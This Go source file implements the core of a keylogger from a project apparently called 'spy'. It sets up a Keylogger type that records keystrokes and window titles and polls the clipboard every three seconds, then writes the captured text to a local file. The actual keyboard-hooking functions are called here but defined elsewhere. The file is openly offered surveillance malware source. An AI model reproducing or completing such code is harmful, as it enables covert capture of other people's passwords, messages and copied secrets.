package keylogger

import (
	"fmt"
	"os"
	"path/filepath"
	"time"

	"github.com/atotto/clipboard"
	"github.com/cinus-e/spy/internal/literr"
	"github.com/cinus-e/spy/internal/util"
)

type Keylogger struct {
	file                                  *os.File
	isKeyboardLogging, isClipboardLogging bool
}

func NewKeylogger(name string, keyboard, clipboard bool) (*Keylogger, error) {
	path, err := filepath.Abs(name)
	if err != nil {
		return nil, err
	}
	file, err := os.Create(path)
	if err != nil {
		return nil, err
	}
	return &Keylogger{file, keyboard, clipboard}, nil
}

func (l *Keylogger) RunKeyboardLogger() {
	if !l.isKeyboardLogging {
		return
	}
	data := make(chan string, 500)
	go WindowLogger(data)
	go KeyLogger(data)
	for l.isKeyboardLogging {
		text := <-data
		if text == "" {
			continue
		}
		l.write(text)
	}
	l.fileClose()
}

func (l *Keylogger) RunClipboardLogger() {
	if !l.isClipboardLogging {
		return
	}
	tmp := ""
	for l.isClipboardLogging {
		text, _ := clipboard.ReadAll()
		if text != tmp {
			l.write(fmt.Sprintf("\n%s[Clipboard]\n%s\n", util.Now(), text))
			tmp = text
		}
		time.Sleep(3 * time.Second)
	}
	l.fileClose()
}

func (l *Keylogger) write(text string) {
	if l.file != nil {
		if _, err := l.file.Write([]byte(text)); err != nil {
			literr.CheckError(err)
		}
	}
}

func (l *Keylogger) fileClose() {
	if l.isKeyboardLogging == false && l.isClipboardLogging == false {
		_ = l.file.Close()
		l.file = nil
	}
}

func (l *Keylogger) Close() {
	l.isKeyboardLogging = false
	l.isClipboardLogging = false
}
